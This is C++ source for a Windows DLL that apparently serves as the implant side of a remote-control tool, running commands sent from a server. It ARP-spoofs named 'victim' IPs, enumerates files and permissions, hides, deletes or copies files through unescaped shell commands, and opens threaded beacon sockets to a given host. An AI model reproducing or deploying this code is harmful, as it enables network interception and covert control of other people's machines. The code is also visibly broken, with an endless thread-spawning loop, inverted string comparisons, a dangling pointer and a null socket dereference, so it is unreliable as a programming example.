#include "Components.h"
#include "arpspoof.h"

#define EXPORTING_DLL

vector<SOCKET*> sockets;
vector<Arpspoof*> spoofvictims;



//string RunNetstat(string nothing);
//string GetAllFiles(string dir);
//string OpenSocket(string ip_and_port);
//string exec(string cmd);
//string getFilePermissions(perms p);
//void getAllFilesInDir(const string &dirPath, vector<MyFileClass> listOfFiles);
//bool ConnectToHost(const char *PortNo, const char* IPAddress, SOCKET* s);
//void CloseConnection(SOCKET s);
//void NewFunction(std::string &ip_and_port);
//string HideFileOrFolder(string pathtofileorfolder);
//string ChangeFile(string file);

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}


/*
split the command from the server by space
*/
vector<string> split(string str)
{
	istringstream iss(str);
	vector<string> tokens;
	copy(istream_iterator<string>(iss),
		istream_iterator<string>(),
		back_inserter(tokens));

	return tokens;
}
/*
	EXECUTE the netstat command
*/
string RunNetstat(string cmd)
{
	return exec("netstat -n -a -o");
}

/*
	get the names,type and permissions of files in a directory
*/
string GetAllFiles(string dir = "c:\\")
{
	string result = "";
	// Get recursive list of files in given directory and its sub directories
	vector<MyFileClass> listOfFiles;
	getAllFilesInDir(dir, listOfFiles);

	for (vector<MyFileClass>::iterator it = listOfFiles.begin(); it != listOfFiles.end(); ++it)
	{
		result += it->getPath();
		result += '\t';
		result += it->getFileType((int)it->getStatus().type());
		result += '\t';
		result += it->getPermissions();
		result += '\n';
	}

	return result;
}
/*
	call function to open a socket in a different  thread
*/
string OpenSocket(std::string ip_and_port)
{
	while (true)
	{
		thread t1(&OpenSocketWithThread, ip_and_port);
		t1.detach();
	}
}
/*
	start thread to spoof victim
*/
string SpoofVictim(std::string ip)
{
		thread t(&SpoofVictimInThread, ip);
		t.detach();
		return "Spoof started";
}

/*
	start spoofing a victim ip. 
	create a spoofing object and add it to the spoofvictims vector
	start spoofing in new thread
*/
void SpoofVictimInThread(std::string ip)
{
	Arpspoof a(ip);
	spoofvictims.push_back(&a);
	a.SendArpReplayForSpoofing(ip);
}

/*
stop spoofing a victim ip.
find a spoofing object in the spoofvictims vector
change the boolean in the object to stop the spoof
*/
bool StopSpoofingVictim(std::string ip)
{
	vector<Arpspoof*>::iterator it = std::find_if(spoofvictims.begin(), spoofvictims.end(), [&ip](Arpspoof *obj) {return obj->_ip == ip; });
	if (it != spoofvictims.end())
	{
		(*it)->stop = true;
	}
	return false;
}

/*
change file
*/
string ChangeFile(string cmd)
{
	vector<string> res = split(cmd);
	vector<string>::iterator it = res.begin();
	string typeofcommand = (*++it);
	if (typeofcommand.compare("+h"))
	{
		return HideFileOrFolder(string((*it)));
	}
	if (typeofcommand.compare("-h"))
	{
		return UnHideFileOrFolder(string((*it)));
	}
	if (typeofcommand.compare("rm"))
	{
		return DeleteGivenFile(string((*it)));
	}
	if (typeofcommand.compare("move"))
	{
		return MoveGivenFileToDestination(string((*++it)), string((*it)));
	}
}

/*
	returns arp table. interface, each ip and mac
*/
string GetArpTable()
{
	string cmd = "arp -a";
	string table = exec(cmd);
	vector<string> tokens = split(table);
	vector<string> arpinfo;
	for (vector<string>::iterator it = tokens.begin(); it != tokens.end(); ++it)
	{
		if (!(it->compare("Interface:")))
		{

			arpinfo.push_back(string((it++)->c_str()));
			arpinfo.push_back(string((it)->c_str()));
		}
		if (!(it->compare("dynamic")))
		{
			arpinfo.push_back(string((----it)->c_str()));
			arpinfo.push_back(string((++it)->c_str()));
			++it;
		}
	}
	string s;
	int i = 1;
	for (vector<string>::iterator it = arpinfo.begin(); it != arpinfo.end(); ++it, i++)
	{
		s.append(it->c_str()).append("\t");
		if (i % 2 == 0) {
			s.append("\n");
		}
	}
	return s;
}


/*
	change attribute to hidden in file or folder
*/
string HideFileOrFolder(string pathtofileorfolder)
{
	string cmd = "attrib +h \"";
	cmd.append(pathtofileorfolder).append("\"");
	return exec(cmd);
}

/*
	turn hidden file to not hidden
*/
string UnHideFileOrFolder(string pathtofileorfolder)
{
	string cmd = "attrib -h \"";
	cmd.append(pathtofileorfolder).append("\"");
	return exec(cmd);
}
/*
	delete file
*/
string DeleteGivenFile(string pathtodelete)
{
	string cmd = "del \"";
	cmd.append(pathtodelete).append("\"");
	return exec(cmd);
}
/*
	move filepath to other directory path
*/
string MoveGivenFileToDestination(string pathtofile, string Destination)
{
	string cmd = "copy \"";
	cmd.append(pathtofile).append("\" \"").append(Destination).append("\"");
	return exec(cmd);
}


/*
	 open a socket in a different  thread and send data every minute
*/
string OpenSocketWithThread(std::string ip_and_port)
{

	SOCKET *s = NULL;
	try
	{
		// split the input to get ip and port
		vector<string> res = split(string(ip_and_port));
		vector<string>::iterator it = res.begin();
		bool success = false;
		for (size_t i = 0; i < 3 && !success; i++)
		{
			success = ConnectToHost(it->c_str(), (++it)->c_str(), s);
		}
		if (success)
		{
			MessageBox(NULL, "success", "success", 0);
			sockets.push_back(s);
		}
		while (success)
		{
			send(*s, "Hi", 2, 0);
			Sleep(60000);
		}
	}
	catch (...)
	{
		vector<SOCKET*>::iterator it = sockets.begin();
		SOCKET sf = std::find(sockets.begin(), sockets.end(), s) != sockets.end();
		if (it != sockets.end())
		{
			CloseConnection(sf);
		}
	}

	return string();
}
/*
	execute in cmd a command
	Input: command
	Output: stdout with returns from commands
	*/
string exec(string cmd)
{
	char buffer[128];
	string result = "";
	FILE *pipe = _popen(cmd.c_str(), "r");
	try
	{
		while (!feof(pipe))
		{
			if (fgets(buffer, 128, pipe) != NULL)
			{
				result += buffer;
			}
		}
	}
	catch (...)
	{
		_pclose(pipe);
	}

	_pclose(pipe);
	return result;
}
/*
	get permissions for each permissions in file
*/
string getFilePermissions(perms p)
{
	string result;
	result += ((p & perms::owner_read) != perms::none ? "r" : "-");
	result += ((p & perms::owner_write) != perms::none ? "w" : "-");
	result += ((p & perms::owner_exec) != perms::none ? "x" : "-");
	result += ((p & perms::group_read) != perms::none ? "r" : "-");
	result += ((p & perms::group_write) != perms::none ? "w" : "-");
	result += ((p & perms::group_exec) != perms::none ? "x" : "-");
	result += ((p & perms::others_read) != perms::none ? "r" : "-");
	result += ((p & perms::others_write) != perms::none ? "w" : "-");
	result += ((p & perms::others_exec) != perms::none ? "x" : "-");
	return result;
}
/*
	the function gets the names and permissions of a file in a dir
	checks if the path exists then iterates through the dir and gets all permissions
	*/
void getAllFilesInDir(const string &dirPath, vector<MyFileClass> listOfFiles)
{
	// Create a vector of string
	try {
		// Check if given path exists and points to a directory
		if (exists(dirPath) && is_directory(dirPath))
		{
			// Create a Directory Iterator object and points to the starting and to endof directory
			directory_iterator iter(dirPath), end;

			// Iterate till end
			while (iter != end)
			{
				// Add the name in vector
				listOfFiles.push_back(MyFileClass(iter->path().filename().string(), iter->status(),
					getFilePermissions(status(iter->path()).permissions())));

				error_code ec;
				// Increment the iterator to point to next entry in recursive iteration
				iter.increment(ec);
				if (ec) {
					cerr << "Error While Accessing : " << iter->path().string() << " :: " << ec.message() << '\n';
				}
			}
		}
	}
	catch (system_error & e)
	{
		cerr << "Exception :: " << e.what();
	}
	//return listOfFiles;
}
/*
	the func opens a socket from a given port to a ip and port
*/
bool ConnectToHost(const char * PortNo, const char * IPAddress, SOCKET* s)
{
	//Start up Winsock…
	WSADATA wsadata;

	int error = WSAStartup(MAKEWORD(2, 2), &wsadata);

	//Did something happen?
	if (error)
		return false;

	//Did we get the right Winsock version?
	if (wsadata.wVersion != 0x0202)
	{
		WSACleanup(); //Clean up Winsock
		return false;
	}

	//Fill out the information needed to initialize a socket…
	addrinfo hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	*s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); //Create socket
	if (*s == INVALID_SOCKET)
	{
		return false; //Couldn't create the socket
	}

	//Try connecting...
	addrinfo *target;
	error = getaddrinfo(IPAddress, PortNo, &hints, &target);
	if (connect(*s, target->ai_addr, (int)target->ai_addrlen) == SOCKET_ERROR)
	{
		return false; //Couldn't connect
	}
	else
	{
		sockets.push_back(s);
		return true; //Success
	}
}
/*
	close socket
*/
void CloseConnection(SOCKET s)
{
	//Close the socket if it exists
	if (s)
		closesocket(s);

	WSACleanup(); //Clean up Winsock
}
